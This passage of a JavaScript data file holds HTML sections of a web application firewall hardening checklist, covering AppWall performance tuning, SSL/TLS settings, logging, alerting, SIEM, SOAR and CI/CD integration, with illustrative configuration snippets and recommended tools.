                                    <td class="p-3 border">40+ Gbps</td>
                                </tr>
                            </tbody>
                        </table>
                    `
                },
                {
                    title: 'Security Policy Optimization',
                    content: `
                        <p class="mb-4 text-gray-700">Optimize security policies to balance protection with performance.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure policy optimization</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">optimization</span></div>
                            <div class="code-comment"># Configure inspection levels</div>
                            <div><span class="code-param">inspection-level</span> <span class="code-value">balanced</span></div>
                            <div><span class="code-param">inspection-order</span> <span class="code-value">most-likely-first</span></div>
                            <div class="code-comment"># URL-specific optimization</div>
                            <div><span class="code-command">url</span> <span class="code-value">add</span> <span class="code-param">path</span> <span class="code-value">"/api/public/status"</span></div>
                            <div><span class="code-command">url</span> <span class="code-value">"/api/public/status"</span></div>
                            <div><span class="code-param">inspection-level</span> <span class="code-value">minimal</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div class="code-comment"># Configure high-security sections</div>
                            <div><span class="code-command">url</span> <span class="code-value">add</span> <span class="code-param">path</span> <span class="code-value">"/admin/*"</span></div>
                            <div><span class="code-command">url</span> <span class="code-value">"/admin/*"</span></div>
                            <div><span class="code-param">inspection-level</span> <span class="code-value">comprehensive</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div class="code-comment"># Optimize signature processing</div>
                            <div><span class="code-command">attack-signatures</span></div>
                            <div><span class="code-param">matching-algorithm</span> <span class="code-value">optimized</span></div>
                            <div><span class="code-param">signature-sets</span> <span class="code-value">enable</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Inspection Level Characteristics</h5>
                        <p class="mb-4 text-gray-700">Different inspection levels offer trade-offs between security and performance:</p>
                        <table class="w-full text-left border-collapse mb-6">
                            <thead>
                                <tr>
                                    <th class="p-3 border bg-gray-100">Inspection Level</th>
                                    <th class="p-3 border bg-gray-100">Security</th>
                                    <th class="p-3 border bg-gray-100">Performance</th>
                                    <th class="p-3 border bg-gray-100">Recommended For</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td class="p-3 border">Minimal</td>
                                    <td class="p-3 border">Low</td>
                                    <td class="p-3 border">High</td>
                                    <td class="p-3 border">Public content, static assets, non-sensitive APIs</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Basic</td>
                                    <td class="p-3 border">Medium-Low</td>
                                    <td class="p-3 border">Medium-High</td>
                                    <td class="p-3 border">General web pages with limited user interaction</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Balanced</td>
                                    <td class="p-3 border">Medium</td>
                                    <td class="p-3 border">Medium</td>
                                    <td class="p-3 border">Standard web applications, default profile</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Enhanced</td>
                                    <td class="p-3 border">Medium-High</td>
                                    <td class="p-3 border">Medium-Low</td>
                                    <td class="p-3 border">Applications with sensitive data, authentication</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Comprehensive</td>
                                    <td class="p-3 border">High</td>
                                    <td class="p-3 border">Low</td>
                                    <td class="p-3 border">Admin interfaces, payment processing, critical functions</td>
                                </tr>
                            </tbody>
                        </table>
                    `
                },
                {
                    title: 'SSL/TLS Optimization',
                    content: `
                        <p class="mb-4 text-gray-700">Optimize SSL/TLS processing to ensure secure connections with minimal performance impact.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure SSL/TLS optimization</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">ssl-tls</span></div>
                            <div class="code-comment"># Hardware acceleration</div>
                            <div><span class="code-param">hardware-acceleration</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Session caching</div>
                            <div><span class="code-param">session-cache</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">session-cache-size</span> <span class="code-value">20000</span></div>
                            <div><span class="code-param">session-timeout</span> <span class="code-value">3600</span></div>
                            <div class="code-comment"># Protocol and cipher optimization</div>
                            <div><span class="code-param">protocol-version</span> <span class="code-value">tlsv1.2 tlsv1.3</span></div>
                            <div><span class="code-param">cipher-preference</span> <span class="code-value">server</span></div>
                            <div><span class="code-param">cipher-groups</span> <span class="code-value">modern</span></div>
                            <div class="code-comment"># OCSP stapling for faster validation</div>
                            <div><span class="code-param">ocsp-stapling</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">ocsp-cache-timeout</span> <span class="code-value">3600</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">SSL/TLS Optimization Techniques</h5>
                        <p class="mb-4 text-gray-700">Key techniques to optimize SSL/TLS performance while maintaining security:</p>
                        <ul class="list-disc pl-6 mb-4 text-gray-700">
                            <li class="mb-2"><strong>TLS 1.3 Preference:</strong> Faster handshakes and improved security</li>
                            <li class="mb-2"><strong>Session Resumption:</strong> Enables clients to reconnect without full handshakes</li>
                            <li class="mb-2"><strong>ECDHE Key Exchange:</strong> More efficient than RSA for key establishment</li>
                            <li class="mb-2"><strong>AES-GCM Ciphers:</strong> Hardware-accelerated on modern processors</li>
                            <li class="mb-2"><strong>OCSP Stapling:</strong> Eliminates separate certificate validation requests</li>
                            <li class="mb-2"><strong>Hardware Acceleration:</strong> Offload cryptographic operations to dedicated hardware</li>
                            <li><strong>Optimized Certificate Chains:</strong> Shorter chains reduce handshake overhead</li>
                        </ul>
                    `
                }
            ],
            tools: [
                {
                    title: 'Performance Monitor',
                    icon: 'fa-tachometer-alt',
                    description: 'Monitor and analyze WAF performance metrics to identify bottlenecks.',
                    link: 'https://www.radware.com/products/appwall/',
                    linkText: 'AppWall Monitoring'
                },
                {
                    title: 'Load Testing Tool',
                    icon: 'fa-weight-hanging',
                    description: 'Generate realistic load to verify WAF performance under various conditions.',
                    link: 'https://locust.io/',
                    linkText: 'Locust'
                },
                {
                    title: 'SSL/TLS Analyzer',
                    icon: 'fa-lock',
                    description: 'Analyze SSL/TLS configuration for performance and security balance.',
                    link: 'https://www.ssllabs.com/ssltest/',
                    linkText: 'SSL Labs'
                },
                {
                    title: 'Network Traffic Analyzer',
                    icon: 'fa-project-diagram',
                    description: 'Analyze network traffic patterns and identify optimization opportunities.',
                    link: 'https://www.wireshark.org/',
                    linkText: 'Wireshark'
                }
            ]
        },
        {
            id: 'reporting',
            title: '9. Reporting & Monitoring',
            subtitle: 'Logging, alerting, and security event management',
            icon: 'fa-chart-line',
            priority: 'high',
            progress: 17,
            checklist: [
                {
                    title: '9.1 Logging Configuration',
                    icon: 'fa-clipboard-list',
                    items: [
                        { id: '9.1.1', text: 'Configure centralized logging', priority: 'critical' },
                        { id: '9.1.2', text: 'Set up log rotation and retention policies', priority: 'high' },
                        { id: '9.1.3', text: 'Configure log format and fields', priority: 'medium' },
                        { id: '9.1.4', text: 'Set up secure log transport (TLS/encryption)', priority: 'high' },
                        { id: '9.1.5', text: 'Configure log integrity verification', priority: 'medium' },
                        { id: '9.1.6', text: 'Implement log storage encryption', priority: 'medium' }
                    ]
                },
                {
                    title: '9.2 Alerting & Monitoring',
                    icon: 'fa-bell',
                    items: [
                        { id: '9.2.1', text: 'Set up real-time security alerts', priority: 'critical' },
                        { id: '9.2.2', text: 'Configure alert thresholds and severity levels', priority: 'high' },
                        { id: '9.2.3', text: 'Implement alert aggregation and correlation', priority: 'medium' },
                        { id: '9.2.4', text: 'Set up performance monitoring alerts', priority: 'medium' },
                        { id: '9.2.5', text: 'Configure notification methods (email, SMS, API)', priority: 'high' },
                        { id: '9.2.6', text: 'Implement escalation procedures for critical alerts', priority: 'high' }
                    ]
                },
                {
                    title: '9.3 Security Analytics',
                    icon: 'fa-chart-bar',
                    items: [
                        { id: '9.3.1', text: 'Configure security dashboard and reporting', priority: 'high' },
                        { id: '9.3.2', text: 'Set up trend analysis for attack patterns', priority: 'medium' },
                        { id: '9.3.3', text: 'Implement attack source tracking and analysis', priority: 'high' },
                        { id: '9.3.4', text: 'Configure compliance reporting', priority: 'medium' },
                        { id: '9.3.5', text: 'Set up executive-level security metrics', priority: 'low' },
                        { id: '9.3.6', text: 'Implement custom security reports and visualizations', priority: 'medium' }
                    ]
                }
            ],
            techniques: [
                {
                    title: 'Centralized Logging Configuration',
                    content: `
                        <p class="mb-4 text-gray-700">Configure centralized logging to collect, store, and analyze security events from the WAF.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure centralized logging</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">logging</span></div>
                            <div class="code-comment"># Local logging settings</div>
                            <div><span class="code-param">local-log</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">local-log-level</span> <span class="code-value">info</span></div>
                            <div><span class="code-param">local-retention</span> <span class="code-value">30</span></div>
                            <div><span class="code-param">local-rotation</span> <span class="code-value">size</span> <span class="code-param">max-size</span> <span class="code-value">500</span></div>
                            <div><span class="code-param">local-compression</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Syslog server configuration</div>
                            <div><span class="code-command">remote-syslog</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"primary-siem"</span></div>
                            <div><span class="code-command">remote-syslog</span> <span class="code-value">"primary-siem"</span></div>
                            <div><span class="code-param">address</span> <span class="code-value">10.0.0.50</span></div>
                            <div><span class="code-param">port</span> <span class="code-value">6514</span></div>
                            <div><span class="code-param">protocol</span> <span class="code-value">tcp</span></div>
                            <div><span class="code-param">format</span> <span class="code-value">cef</span></div>
                            <div><span class="code-param">facility</span> <span class="code-value">local5</span></div>
                            <div><span class="code-param">ssl</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">ssl-verify</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Configure backup syslog server</div>
                            <div><span class="code-command">remote-syslog</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"backup-siem"</span></div>
                            <div><span class="code-command">remote-syslog</span> <span class="code-value">"backup-siem"</span></div>
                            <div><span class="code-param">address</span> <span class="code-value">10.0.1.50</span></div>
                            <div><span class="code-param">port</span> <span class="code-value">6514</span></div>
                            <div><span class="code-param">protocol</span> <span class="code-value">tcp</span></div>
                            <div><span class="code-param">format</span> <span class="code-value">cef</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Log Formats and Standards</h5>
                        <p class="mb-4 text-gray-700">Common log formats for security event integration:</p>
                        <table class="w-full text-left border-collapse mb-6">
                            <thead>
                                <tr>
                                    <th class="p-3 border bg-gray-100">Format</th>
                                    <th class="p-3 border bg-gray-100">Description</th>
                                    <th class="p-3 border bg-gray-100">Best For</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td class="p-3 border">CEF (Common Event Format)</td>
                                    <td class="p-3 border">ArcSight's format with standardized field structure</td>
                                    <td class="p-3 border">Enterprise SIEM integration (ArcSight, Splunk)</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">LEEF (Log Event Extended Format)</td>
                                    <td class="p-3 border">IBM QRadar's structured log format</td>
                                    <td class="p-3 border">QRadar SIEM environments</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">JSON</td>
                                    <td class="p-3 border">Structured format with field-value pairs</td>
                                    <td class="p-3 border">Modern analytics platforms (ELK Stack)</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Syslog RFC5424</td>
                                    <td class="p-3 border">Standardized syslog format</td>
                                    <td class="p-3 border">Unix/Linux environments, general compatibility</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">GELF (Graylog Extended Format)</td>
                                    <td class="p-3 border">Optimized for Graylog with compression support</td>
                                    <td class="p-3 border">Graylog-based logging systems</td>
                                </tr>
                            </tbody>
                        </table>
                    `
                },
                {
                    title: 'Security Alerting Configuration',
                    content: `
                        <p class="mb-4 text-gray-700">Configure alerts to notify security teams of important security events and policy violations.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure security alerts</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">alerts</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Email notification configuration</div>
                            <div><span class="code-command">email</span></div>
                            <div><span class="code-param">server</span> <span class="code-value">smtp.example.com</span></div>
                            <div><span class="code-param">port</span> <span class="code-value">587</span></div>
                            <div><span class="code-param">authentication</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">username</span> <span class="code-value">alerting@example.com</span></div>
                            <div><span class="code-param">password</span> <span class="code-value">********</span></div>
                            <div><span class="code-param">from-address</span> <span class="code-value">waf-alerts@example.com</span></div>
                            <div><span class="code-param">tls</span> <span class="code-value">enable</span></div>
                            <div><span class="code-command">recipient</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">security-team@example.com</span> <span class="code-param">severity</span> <span class="code-value">high</span></div>
                            <div><span class="code-command">recipient</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">soc@example.com</span> <span class="code-param">severity</span> <span class="code-value">critical</span></div>
                            <div class="code-comment"># Webhook integration for alerting</div>
                            <div><span class="code-command">webhook</span></div>
                            <div><span class="code-param">url</span> <span class="code-value">https://hooks.slack.com/services/TXXXXX/BXXXXX/XXXXXXXXXX</span></div>
                            <div><span class="code-param">format</span> <span class="code-value">json</span></div>
                            <div><span class="code-param">severity</span> <span class="code-value">medium,high,critical</span></div>
                            <div class="code-comment"># Alert thresholds</div>
                            <div><span class="code-command">thresholds</span></div>
                            <div><span class="code-param">attack-threshold</span> <span class="code-value">10</span> <span class="code-param">period</span> <span class="code-value">60</span> <span class="code-param">severity</span> <span class="code-value">high</span></div>
                            <div><span class="code-param">dos-threshold</span> <span class="code-value">1000</span> <span class="code-param">period</span> <span class="code-value">60</span> <span class="code-param">severity</span> <span class="code-value">critical</span></div>
                            <div><span class="code-param">brute-force-threshold</span> <span class="code-value">5</span> <span class="code-param">period</span> <span class="code-value">300</span> <span class="code-param">severity</span> <span class="code-value">high</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Alert Prioritization Framework</h5>
                        <p class="mb-4 text-gray-700">Effective alert management requires proper prioritization to avoid alert fatigue:</p>
                        <table class="w-full text-left border-collapse mb-6">
                            <thead>
                                <tr>
                                    <th class="p-3 border bg-gray-100">Severity</th>
                                    <th class="p-3 border bg-gray-100">Response Time</th>
                                    <th class="p-3 border bg-gray-100">Example Events</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td class="p-3 border">Critical</td>
                                    <td class="p-3 border">Immediate (24/7)</td>
                                    <td class="p-3 border">Successful data exfiltration, active breach, DDoS attack</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">High</td>
                                    <td class="p-3 border">Within 1 hour</td>
                                    <td class="p-3 border">SQL injection attempts, admin access violations, multiple attack vectors</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Medium</td>
                                    <td class="p-3 border">Within 8 hours</td>
                                    <td class="p-3 border">Pattern of suspicious activity, repeated policy violations</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Low</td>
                                    <td class="p-3 border">Within 24 hours</td>
                                    <td class="p-3 border">Single blocked attacks, minor policy violations</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Informational</td>
                                    <td class="p-3 border">Routine review</td>
                                    <td class="p-3 border">Configuration changes, system updates, learning mode events</td>
                                </tr>
                            </tbody>
                        </table>
                    `
                },
                {
                    title: 'Security Dashboard Configuration',
                    content: `
                        <p class="mb-4 text-gray-700">Configure security dashboards to provide actionable insights into WAF activity and threats.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure security dashboard</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">dashboard</span></div>
                            <div><span class="code-param">refresh-interval</span> <span class="code-value">60</span></div>
                            <div class="code-comment"># Configure widgets and visualizations</div>
                            <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"attack-summary"</span> <span class="code-param">position</span> <span class="code-value">1</span></div>
                            <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"top-attackers"</span> <span class="code-param">position</span> <span class="code-value">2</span></div>
                            <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"geo-map"</span> <span class="code-param">position</span> <span class="code-value">3</span></div>
                            <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"policy-violations"</span> <span class="code-param">position</span> <span class="code-value">4</span></div>
                            <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"traffic-summary"</span> <span class="code-param">position</span> <span class="code-value">5</span></div>
                            <div class="code-comment"># Custom dashboard for executives</div>
                            <div><span class="code-command">dashboard</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"executive-view"</span></div>
                            <div><span class="code-command">dashboard</span> <span class="code-value">"executive-view"</span></div>
                            <div><span class="code-param">description</span> <span class="code-value">"High-level security summary for management"</span></div>
                            <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"security-score"</span> <span class="code-param">position</span> <span class="code-value">1</span></div>
                            <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"monthly-trends"</span> <span class="code-param">position</span> <span class="code-value">2</span></div>
                            <div><span class="code-command">widget</span> <span class="code-value">enable</span> <span class="code-param">name</span> <span class="code-value">"compliance-status"</span> <span class="code-param">position</span> <span class="code-value">3</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Key Security Metrics</h5>
                        <p class="mb-4 text-gray-700">Essential metrics for effective security monitoring:</p>
                        <ul class="list-disc pl-6 mb-4 text-gray-700">
                            <li class="mb-2"><strong>Attacks Blocked:</strong> Volume of malicious requests prevented from reaching applications</li>
                            <li class="mb-2"><strong>Attack Distribution:</strong> Types of attacks (SQL injection, XSS, etc.) and their relative frequency</li>
                            <li class="mb-2"><strong>Top Attack Sources:</strong> IPs, countries, and ASNs generating the most attacks</li>
                            <li class="mb-2"><strong>False Positive Rate:</strong> Percentage of legitimate traffic incorrectly blocked</li>
                            <li class="mb-2"><strong>Security Policy Compliance:</strong> Adherence to configured security policies</li>
                            <li class="mb-2"><strong>Mean Time to Detect (MTTD):</strong> Average time to identify security incidents</li>
                            <li><strong>Mean Time to Respond (MTTR):</strong> Average time to address and mitigate threats</li>
                        </ul>
                    `
                }
            ],
            tools: [
                {
                    title: 'SIEM Integration',
                    icon: 'fa-database',
                    description: 'Security Information and Event Management system for centralized log analysis.',
                    link: 'https://www.splunk.com/',
                    linkText: 'Splunk'
                },
                {
                    title: 'ELK Stack',
                    icon: 'fa-layer-group',
                    description: 'Elasticsearch, Logstash, and Kibana stack for log management and visualization.',
                    link: 'https://www.elastic.co/elastic-stack',
                    linkText: 'Elastic Stack'
                },
                {
                    title: 'Log Analyzer',
                    icon: 'fa-search',
                    description: 'Tool for analyzing WAF logs to identify patterns and anomalies.',
                    link: 'https://www.graylog.org/',
                    linkText: 'Graylog'
                },
                {
                    title: 'Alert Management',
                    icon: 'fa-bell',
                    description: 'Platform for managing security alerts and coordinating response activities.',
                    link: 'https://www.pagerduty.com/',
                    linkText: 'PagerDuty'
                }
            ]
        },
        {
            id: 'integration',
            title: '10. Integration & Automation',
            subtitle: 'SIEM integration, orchestration, and DevSecOps alignment',
            icon: 'fa-plug',
            priority: 'medium',
            progress: 0,
            checklist: [
                {
                    title: '10.1 SIEM Integration',
                    icon: 'fa-database',
                    items: [
                        { id: '10.1.1', text: 'Configure SIEM connector and data formats', priority: 'high' },
                        { id: '10.1.2', text: 'Set up log forwarding to SIEM platforms', priority: 'high' },
                        { id: '10.1.3', text: 'Implement structured data mapping for SIEM', priority: 'medium' },
                        { id: '10.1.4', text: 'Configure alert integration with SOC platforms', priority: 'high' },
                        { id: '10.1.5', text: 'Set up bidirectional SIEM integration', priority: 'medium' }
                    ]
                },
                {
                    title: '10.2 Security Orchestration',
                    icon: 'fa-cogs',
                    items: [
                        { id: '10.2.1', text: 'Configure security orchestration platform integration', priority: 'high' },
                        { id: '10.2.2', text: 'Set up automated incident response workflows', priority: 'medium' },
                        { id: '10.2.3', text: 'Implement threat intelligence integration', priority: 'high' },
                        { id: '10.2.4', text: 'Configure dynamic policy updates based on threats', priority: 'medium' },
                        { id: '10.2.5', text: 'Set up API-based security control automation', priority: 'medium' }
                    ]
                },
                {
                    title: '10.3 DevSecOps Integration',
                    icon: 'fa-code-branch',
                    items: [
                        { id: '10.3.1', text: 'Configure CI/CD pipeline integration', priority: 'high' },
                        { id: '10.3.2', text: 'Set up policy-as-code implementation', priority: 'medium' },
                        { id: '10.3.3', text: 'Implement automated security testing feedback', priority: 'high' },
                        { id: '10.3.4', text: 'Configure automated WAF configuration validation', priority: 'medium' },
                        { id: '10.3.5', text: 'Set up automated environment synchronization', priority: 'medium' },
                        { id: '10.3.6', text: 'Implement version control for WAF configurations', priority: 'high' }
                    ]
                }
            ],
            techniques: [
                {
                    title: 'SIEM Integration Configuration',
                    content: `
                        <p class="mb-4 text-gray-700">Configure integration with Security Information and Event Management (SIEM) systems for comprehensive security monitoring.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure SIEM integration</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">siem-integration</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Splunk integration</div>
                            <div><span class="code-command">splunk</span></div>
                            <div><span class="code-param">endpoint</span> <span class="code-value">https://splunk.example.com:8088/services/collector</span></div>
                            <div><span class="code-param">token</span> <span class="code-value">********</span></div>
                            <div><span class="code-param">format</span> <span class="code-value">json</span></div>
                            <div><span class="code-param">source</span> <span class="code-value">radware-appwall</span></div>
                            <div><span class="code-param">sourcetype</span> <span class="code-value">appwall:security</span></div>
                            <div><span class="code-param">index</span> <span class="code-value">security</span></div>
                            <div><span class="code-param">verify-ssl</span> <span class="code-value">true</span></div>
                            <div class="code-comment"># QRadar integration</div>
                            <div><span class="code-command">qradar</span></div>
                            <div><span class="code-param">server</span> <span class="code-value">10.0.0.55</span></div>
                            <div><span class="code-param">port</span> <span class="code-value">514</span></div>
                            <div><span class="code-param">protocol</span> <span class="code-value">tcp</span></div>
                            <div><span class="code-param">format</span> <span class="code-value">leef</span></div>
                            <div><span class="code-param">tls</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Field mapping</div>
                            <div><span class="code-command">field-mapping</span></div>
                            <div><span class="code-param">attack_type</span> <span class="code-value">signature_name</span></div>
                            <div><span class="code-param">src_ip</span> <span class="code-value">client_ip</span></div>
                            <div><span class="code-param">dest_ip</span> <span class="code-value">server_ip</span></div>
                            <div><span class="code-param">severity</span> <span class="code-value">risk_level</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">SIEM Integration Benefits</h5>
                        <p class="mb-4 text-gray-700">Key advantages of WAF-SIEM integration:</p>
                        <ul class="list-disc pl-6 mb-4 text-gray-700">
                            <li class="mb-2"><strong>Centralized Security Visibility:</strong> Consolidated view of all security events</li>
                            <li class="mb-2"><strong>Cross-System Correlation:</strong> Identify complex attacks spanning multiple systems</li>
                            <li class="mb-2"><strong>Advanced Analytics:</strong> Apply machine learning and behavioral analysis</li>
                            <li class="mb-2"><strong>Historical Analysis:</strong> Retain and analyze long-term security trends</li>
                            <li class="mb-2"><strong>Compliance Reporting:</strong> Generate comprehensive security reports</li>
                            <li><strong>Context Enrichment:</strong> Add threat intelligence and asset information</li>
                        </ul>
                    `
                },
                {
                    title: 'Security Orchestration and Automation',
                    content: `
                        <p class="mb-4 text-gray-700">Configure security orchestration to automate incident response and threat mitigation.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure security orchestration</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">orchestration</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># SOAR platform integration</div>
                            <div><span class="code-command">soar</span></div>
                            <div><span class="code-param">platform</span> <span class="code-value">phantom</span></div>
                            <div><span class="code-param">endpoint</span> <span class="code-value">https://phantom.example.com/api/v2</span></div>
                            <div><span class="code-param">api-key</span> <span class="code-value">********</span></div>
                            <div><span class="code-param">verify-ssl</span> <span class="code-value">true</span></div>
                            <div class="code-comment"># Threat intelligence integration</div>
                            <div><span class="code-command">threat-intel</span></div>
                            <div><span class="code-param">platform</span> <span class="code-value">virustotal</span></div>
                            <div><span class="code-param">api-key</span> <span class="code-value">********</span></div>
                            <div><span class="code-param">update-interval</span> <span class="code-value">3600</span></div>
                            <div class="code-comment"># Automated response actions</div>
                            <div><span class="code-command">action</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"block-ip"</span></div>
                            <div><span class="code-command">action</span> <span class="code-value">"block-ip"</span></div>
                            <div><span class="code-param">trigger</span> <span class="code-value">high-risk-attack</span></div>
                            <div><span class="code-param">endpoint</span> <span class="code-value">https://api.example.com/block</span></div>
                            <div><span class="code-param">method</span> <span class="code-value">post</span></div>
                            
                            <div><span class="code-param">headers</span> <span class="code-value">{"Authorization":"Bearer ********"}</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Common Orchestration Workflows</h5>
                        <p class="mb-4 text-gray-700">Effective security automation workflows for WAF incidents:</p>
                        <table class="w-full text-left border-collapse mb-6">
                            <thead>
                                <tr>
                                    <th class="p-3 border bg-gray-100">Workflow</th>
                                    <th class="p-3 border bg-gray-100">Trigger</th>
                                    <th class="p-3 border bg-gray-100">Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td class="p-3 border">IP Reputation Check</td>
                                    <td class="p-3 border">New IP detected attacking the application</td>
                                    <td class="p-3 border">Check IP against threat intelligence, add to block list if malicious</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Brute Force Response</td>
                                    <td class="p-3 border">Brute force attack detection</td>
                                    <td class="p-3 border">Temporarily block IP, enable additional challenges, alert security team</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Dynamic WAF Tuning</td>
                                    <td class="p-3 border">Repeated false positives</td>
                                    <td class="p-3 border">Create temporary exception, escalate for review, monitor and adjust</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Data Exfiltration Response</td>
                                    <td class="p-3 border">Detection of sensitive data in responses</td>
                                    <td class="p-3 border">Block traffic, capture forensic data, escalate to incident response team</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Zero-Day Vulnerability Response</td>
                                    <td class="p-3 border">Threat intelligence indicating new vulnerability</td>
                                    <td class="p-3 border">Deploy virtual patch, increase monitoring, schedule application update</td>
                                </tr>
                            </tbody>
                        </table>
                    `
                },
                {
                    title: 'DevSecOps Integration',
                    content: `
                        <p class="mb-4 text-gray-700">Integrate WAF configuration management with development and deployment pipelines for continuous security.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure DevSecOps integration</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">devsecops</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Version control integration</div>
                            <div><span class="code-command">version-control</span></div>
                            <div><span class="code-param">system</span> <span class="code-value">git</span></div>
                            <div><span class="code-param">repository</span> <span class="code-value">https://github.com/example/waf-configs.git</span></div>
                            <div><span class="code-param">branch</span> <span class="code-value">main</span></div>
                            <div><span class="code-param">auth-type</span> <span class="code-value">ssh-key</span></div>
                            <div><span class="code-param">key-file</span> <span class="code-value">/etc/appwall/ssh/id_rsa</span></div>
                            <div><span class="code-param">auto-commit</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">commit-message</span> <span class="code-value">"[Automated] WAF configuration update"</span></div>
                            <div class="code-comment"># CI/CD pipeline integration</div>
                            <div><span class="code-command">pipeline</span></div>
                            <div><span class="code-param">system</span> <span class="code-value">jenkins</span></div>
                            <div><span class="code-param">endpoint</span> <span class="code-value">https://jenkins.example.com</span></div>
                            <div><span class="code-param">credentials</span> <span class="code-value">jenkins-waf-user</span></div>
                            <div><span class="code-param">webhook</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">webhook-url</span> <span class="code-value">https://appwall.example.com/api/webhook/deploy</span></div>
                            <div class="code-comment"># Environment management</div>
                            <div><span class="code-command">environments</span></div>
                            <div><span class="code-command">environment</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"development"</span> <span class="code-param">url</span> <span class="code-value">https://dev-appwall.example.com</span></div>
                            <div><span class="code-command">environment</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"staging"</span> <span class="code-param">url</span> <span class="code-value">https://staging-appwall.example.com</span></div>
                            <div><span class="code-command">environment</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"production"</span> <span class="code-param">url</span> <span class="code-value">https://prod-appwall.example.com</span></div>
                            <div><span class="code-command">commit</span></div>
